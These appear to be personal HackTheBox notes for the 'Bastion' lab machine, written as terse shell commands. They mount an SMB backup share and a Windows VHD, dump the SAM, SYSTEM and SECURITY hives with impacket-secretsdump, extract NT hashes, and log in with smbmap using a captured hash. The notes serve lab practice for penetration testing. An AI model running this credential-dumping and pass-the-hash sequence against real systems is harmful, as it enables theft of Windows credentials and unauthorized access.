```
sudo mkdir /mnt/bastion
sudo mount -t cifs //10.129.1.39/Backups /mnt/bastion

sudo mkdir /mnt/vhd
guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v /mnt/vhd
```

! To check files use root user. Normal user get empty from the /mnt/
```
cp SAM SYSTEM SECURITY /home/alvin/Documents/OSCP-PWK/HackTheBox/Windows/Bastion

impacket-secretsdump -system SYSTEM -sam SAM LOCAL | tee addump
impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY LOCAL | tee addump
cat addump | grep ":::" | cut -d: -f4

smbmap -u L4mpje -p 9bfe57d5c3309db3a151772f9d86c6cd -H 10.129.209.215
```

### Unmount do this later. It might crash the machine or vpn. Reset everything if smell funcky
`guestunmount`

